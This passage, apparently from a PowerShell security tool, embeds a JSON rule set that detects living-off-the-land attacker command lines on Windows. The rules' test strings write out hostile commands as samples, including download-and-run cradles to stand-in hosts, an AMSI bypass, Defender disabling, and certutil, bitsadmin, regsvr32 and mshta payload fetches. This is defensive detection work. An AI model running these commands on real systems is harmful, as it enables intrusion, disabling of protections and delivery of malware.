'@
$script:WfxEmbeddedRules['lotl'] = @'
{
  "name": "Living-off-the-land and attacker command lines",
  "version": "2026.10",
  "rules": [
    {
      "id": "LOTL-PS-ENCODED",
      "title": "PowerShell with an encoded command",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "pattern": "(?i)(?:^|\\s)[-/]e(?:nc(?:odedcommand)?|c|ncodedcommand)?\\s+[A-Za-z0-9+/=]{40,}",
      "technique": [
        "T1059.001",
        "T1027.010"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "PowerShell was given a Base64-encoded command, which hides what it runs. Common in malware launchers and droppers.",
      "recommendation": "Decode the Base64 (UTF-16LE) to see the real command. Check the parent process and how it was started.",
      "tests": {
        "match": [
          "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
          "pwsh -EncodedCommand JABhAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAnAA=="
        ],
        "nomatch": [
          "powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1",
          "powershell -e short"
        ]
      }
    },
    {
      "id": "LOTL-PS-DOWNLOAD-CRADLE",
      "title": "PowerShell download-and-run cradle",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "pattern": "(?i)(?:iex|invoke-expression|\\.invoke\\(\\)|\\|\\s*&|&\\s*\\(\\s*\\$)[\\s\\S]{0,200}(?:downloadstring|downloaddata|invoke-webrequest|iwr|irm|invoke-restmethod|net\\.webclient|start-bitstransfer)|(?:downloadstring|downloaddata|invoke-restmethod|irm|iwr|invoke-webrequest)[\\s\\S]{0,300}(?:\\|\\s*iex|\\|\\s*invoke-expression|iex\\s*\\()",
      "technique": [
        "T1059.001",
        "T1105"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "PowerShell downloads code from the network and executes it in memory without saving a file — a classic first-stage loader.",
      "recommendation": "Identify the URL, fetch it safely in a sandbox, and block the domain/IP. Look for what ran next (child processes, new connections).",
      "tests": {
        "match": [
          "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\"",
          "powershell iwr https://evil.example/p.ps1 -UseBasicParsing | iex",
          "powershell -c irm https://get.example.com/install.ps1 | iex"
        ],
        "nomatch": [
          "powershell -c Invoke-WebRequest https://example.com/file.zip -OutFile C:\\temp\\file.zip",
          "powershell -File C:\\Program Files\\App\\update.ps1"
        ]
      }
    },
    {
      "id": "LOTL-PS-HIDDEN-BYPASS",
      "title": "PowerShell launched hidden with policy bypass",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "pattern": "(?i)(?=.*(?:^|\\s)[-/]w(?:in(?:dowstyle)?)?\\s+h(?:idden)?\\b)(?=.*(?:[-/]ep?\\s+bypass|[-/]exec(?:utionpolicy)?\\s+bypass|[-/]nop(?:rofile)?\\b))",
      "technique": [
        "T1059.001"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "Hidden window plus execution-policy bypass or no profile is typical of scripted attacks, though some admin tools do this too.",
      "recommendation": "Check the script or command being run, and whether the parent (e.g. Office, browser, scheduled task) is expected.",
      "tests": {
        "match": [
          "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\\Users\\a\\AppData\\x.ps1",
          "powershell -windowstyle hidden -ep bypass -c whoami"
        ],
        "nomatch": [
          "powershell -ep bypass -File .\\build.ps1",
          "powershell.exe -WindowStyle Hidden -File C:\\Windows\\ccmcache\\x.ps1"
        ]
      }
    },
    {
      "id": "LOTL-PS-AMSI-BYPASS",
      "title": "AMSI / script-scanning bypass attempt",
      "images": [],
      "pattern": "(?i)amsiutils|amsiinitfailed|amsiscanbuffer|amsicontext|amsi\\.dll.{0,80}(?:virtualprotect|patch)|\\[ref\\]\\.assembly\\.gettype\\(.{0,40}amsi",
      "technique": [
        "T1562.001"
      ],
      "severity": "Critical",
      "confidence": "High",
      "description": "A command tried to disable the Antimalware Scan Interface so malicious scripts aren't scanned. Legitimate software essentially never does this.",
      "recommendation": "Treat the host as compromised. Capture the full script (event 4104), isolate the machine and look for follow-on activity.",
      "tests": {
        "match": [
          "powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        ],
        "nomatch": [
          "powershell -c Get-Process"
        ]
      }
    },
    {
      "id": "LOTL-PS-REFLECTIVE",
      "title": "In-memory .NET assembly loading",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "pattern": "(?i)(?:\\[system\\.reflection\\.assembly\\]|\\[reflection\\.assembly\\])\\s*::\\s*load(?:file|from)?\\s*\\(\\s*(?:\\[convert\\]::frombase64string|\\(new-object|\\$)|frombase64string[\\s\\S]{0,200}::load\\(",
      "technique": [
        "T1620",
        "T1027"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "PowerShell loads a .NET assembly straight from memory (often Base64), a common way to run tools like loaders and post-exploitation kits without touching disk.",
      "recommendation": "Recover the Base64 blob from the command or event 4104 and analyze it in a sandbox.",
      "tests": {
        "match": [
          "powershell -c [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))"
        ],
        "nomatch": [
          "powershell -c [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')"
        ]
      }
    },
    {
      "id": "LOTL-PS-DEFENDER-TAMPER",
      "title": "Microsoft Defender disabled or excluded from the command line",
      "images": [],
      "pattern": "(?i)set-mppreference\\s[^\\n]{0,200}-disable(?:realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning|blockatfirstseen)\\s+(?:\\$true|1)|add-mppreference\\s[^\\n]{0,100}-exclusion(?:path|process|extension)|sc(?:\\.exe)?\\s+(?:stop|config)\\s+windefend",
      "technique": [
        "T1562.001"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "Antivirus protection was turned off or a folder/process was excluded from scanning — attackers do this right before dropping payloads.",
      "recommendation": "Re-enable protection, remove unexpected exclusions (Get-MpPreference) and scan the excluded locations.",
      "tests": {
        "match": [
          "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
          "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\Public"
        ],
        "nomatch": [
          "powershell Get-MpPreference",
          "powershell Set-MpPreference -DisableRealtimeMonitoring $false"
        ]
      }
    },
    {
      "id": "LOTL-MSHTA",
      "title": "mshta running remote or inline script",
      "images": [
        "mshta.exe"
      ],
      "pattern": "(?i)(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)|javascript:|vbscript:|\\.hta\\b",
      "technique": [
        "T1218.005"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "mshta.exe executed an HTA file or inline script. It is heavily abused for initial access (including fake-CAPTCHA “ClickFix” lures) and rarely used legitimately.",
      "recommendation": "Find where the URL/file came from (browser history, email, RunMRU), block it, and check for payloads it dropped.",
      "tests": {
        "match": [
          "mshta.exe https://cdn.example/verify.hta",
          "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell\"\"\")(window.close)"
        ],
        "nomatch": [
          "mshta.exe"
        ]
      }
    },
    {
      "id": "LOTL-WSCRIPT-USERPATH",
      "title": "Windows Script Host running a script from a user folder",
      "images": [
        "wscript.exe",
        "cscript.exe"
      ],
      "pattern": "(?i)\\\\(?:appdata|temp|downloads|desktop|users\\\\public|programdata)\\\\[^\\n]*\\.(?:js|jse|vbs|vbe|wsf|wsh)\\b",
      "technique": [
        "T1059.005",
        "T1059.007"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "A JScript/VBScript file ran from a user-writable folder — the usual path for malicious email and download attachments.",
      "recommendation": "Collect the script, check how it arrived (email/download), and look for child processes it started.",
      "tests": {
        "match": [
          "wscript.exe \"C:\\Users\\bob\\Downloads\\Invoice_2026.js\"",
          "cscript //nologo C:\\Users\\bob\\AppData\\Local\\Temp\\a.vbs"
        ],
        "nomatch": [
          "cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli"
        ]
      }
    },
    {
      "id": "LOTL-CERTUTIL-DOWNLOAD",
      "title": "certutil used to download a file",
      "images": [
        "certutil.exe"
      ],
      "pattern": "(?i)-(?:urlcache|verifyctl)\\b|(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)",
      "technique": [
        "T1105"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "certutil.exe fetched a file from the network. Attackers use it as a built-in downloader.",
      "recommendation": "Find and hash the downloaded file, check it against threat intelligence, and block the source.",
      "tests": {
        "match": [
          "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe",
          "certutil -verifyctl -f -split https://x.example/p"
        ],
        "nomatch": [
          "certutil -hashfile C:\\file.zip SHA256",
          "certutil -store my"
        ]
      }
    },
    {
      "id": "LOTL-CERTUTIL-DECODE",
      "title": "certutil used to decode a file",
      "images": [
        "certutil.exe"
      ],
      "pattern": "(?i)-decode(?:hex)?\\b",
      "technique": [
        "T1140"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "certutil.exe decoded a Base64/hex file — often used to unpack a payload smuggled as text.",
      "recommendation": "Inspect the input and output files named in the command line.",
      "tests": {
        "match": [
          "certutil -decode C:\\Users\\a\\AppData\\Local\\Temp\\p.txt C:\\Users\\a\\p.exe"
        ],
        "nomatch": [
          "certutil -encode in.bin out.txt"
        ]
      }
    },
    {
      "id": "LOTL-BITSADMIN",
      "title": "bitsadmin download or command job",
      "images": [
        "bitsadmin.exe"
      ],
      "pattern": "(?i)/(?:transfer|addfile|setnotifycmdline|create)\\b",
      "technique": [
        "T1197",
        "T1105"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "BITS was used to download a file or run a command when a job completes — a stealthy persistence and download method.",
      "recommendation": "List BITS jobs (Get-BitsTransfer -AllUsers) and investigate the URL and notify command.",
      "tests": {
        "match": [
          "bitsadmin /transfer job /download /priority high http://x.example/a.exe C:\\Users\\Public\\a.exe",
          "bitsadmin /SetNotifyCmdLine myjob C:\\Windows\\Temp\\run.exe NULL"
        ],
        "nomatch": [
          "bitsadmin /list /allusers"
        ]
      }
    },
    {
      "id": "LOTL-CURL-RAW-IP",
      "title": "curl downloading from a raw IP address",
      "images": [
        "curl.exe"
      ],
      "pattern": "(?i)https?://\\d{1,3}(?:\\.\\d{1,3}){3}(?::\\d+)?/",
      "technique": [
        "T1105"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "curl.exe fetched content from a bare IP address rather than a named site — common for attacker staging servers.",
      "recommendation": "Look up the IP's reputation and check what was saved (-o) and executed afterwards.",
      "tests": {
        "match": [
          "curl.exe -o C:\\Users\\Public\\x.exe http://198.51.100.7:8080/x.exe"
        ],
        "nomatch": [
          "curl.exe -o setup.exe https://download.example.com/setup.exe"
        ]
      }
    },
    {
      "id": "LOTL-FINGER",
      "title": "finger.exe used to fetch commands",
      "images": [
        "finger.exe"
      ],
      "pattern": "(?i)@",
      "technique": [
        "T1105",
        "T1204.004"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "finger.exe queried a remote host. It has almost no modern legitimate use and is abused in ClickFix campaigns to pull down the next command.",
      "recommendation": "Block the remote host and check RunMRU/clipboard-driven executions on this machine.",
      "tests": {
        "match": [
          "finger.exe gate@203.0.113.9",
          "cmd /c finger x@evil.example | cmd"
        ],
        "nomatch": [
          "finger.exe"
        ]
      }
    },
    {
      "id": "LOTL-REGSVR32-REMOTE",
      "title": "regsvr32 loading a remote scriptlet (Squiblydoo)",
      "images": [
        "regsvr32.exe"
      ],
      "pattern": "(?i)/i:\\s*(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)|scrobj\\.dll",
      "technique": [
        "T1218.010"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "regsvr32 executed a scriptlet from a URL or via scrobj.dll — a well-known application-control bypass.",
      "recommendation": "Retrieve the scriptlet URL, block it, and review child processes.",
      "tests": {
        "match": [
          "regsvr32 /s /n /u /i:http://x.example/file.sct scrobj.dll"
        ],
        "nomatch": [
          "regsvr32 /s C:\\Program Files\\App\\component.dll"
        ]
      }
    },
    {
      "id": "LOTL-REGSVR32-USERPATH",
      "title": "regsvr32 registering a DLL from a user folder",
      "images": [
        "regsvr32.exe"
      ],
      "pattern": "(?i)\\\\(?:appdata|temp|downloads|users\\\\public|programdata)\\\\",
      "technique": [
        "T1218.010"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "regsvr32 loaded a DLL from a user-writable folder — a frequent way to execute malicious DLLs.",
      "recommendation": "Hash the DLL and check its signature and origin.",
      "tests": {
        "match": [
          "regsvr32.exe /s C:\\Users\\bob\\AppData\\Roaming\\upd.dll"
        ],
        "nomatch": [
          "regsvr32.exe /s C:\\Windows\\System32\\jscript.dll"
        ]
      }
    },
    {
      "id": "LOTL-RUNDLL32-SUSPICIOUS",
      "title": "rundll32 running script or a URL handler",
      "images": [
        "rundll32.exe"
      ],
      "pattern": "(?i)javascript:|vbscript:|mshtml,RunHTMLApplication|url\\.dll,(?:OpenURL|FileProtocolHandler)|zipfldr\\.dll,RouteTheCall|shell32\\.dll,ShellExec_RunDLL|advpack\\.dll,(?:LaunchINFSection|RegisterOCX)|ieadvpack\\.dll|pcwutl\\.dll,LaunchApplication|(?:https?://|\\\\\\\\[\\w.\\-]+\\\\)",
      "technique": [
        "T1218.011"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "rundll32 was used to run script or launch another program through a Windows DLL export — common proxy-execution tricks.",
      "recommendation": "Look at the full command line and the process it launched.",
      "tests": {
        "match": [
          "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
          "rundll32.exe url.dll,OpenURL C:\\Users\\a\\x.hta"
        ],
        "nomatch": [
          "rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl"
        ]
      }
    },
    {
      "id": "LOTL-RUNDLL32-USERPATH",
      "title": "rundll32 loading a DLL from a user folder",
      "images": [
        "rundll32.exe"
      ],
      "pattern": "(?i)\\\\(?:appdata|temp|downloads|users\\\\public|programdata|desktop)\\\\[^,\\n]+\\.(?:dll|dat|tmp|png|jpg|bin|ocx|cpl|txt|log)\\b",
      "technique": [
        "T1218.011"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "rundll32 executed code from a user-writable folder (sometimes disguised with a non-DLL extension) — typical of loaders like those used by banking trojans and ransomware precursors.",
      "recommendation": "Hash and submit the DLL for analysis; check persistence entries that reference it.",
      "tests": {
        "match": [
          "rundll32.exe C:\\Users\\bob\\AppData\\Local\\Temp\\x.dat,DllRegisterServer",
          "rundll32 C:\\ProgramData\\upd\\img.png,Start"
        ],
        "nomatch": [
          "rundll32.exe C:\\Windows\\System32\\printui.dll,PrintUIEntry /il"
        ]
      }
    },
    {
      "id": "LOTL-COMSVCS-MINIDUMP",
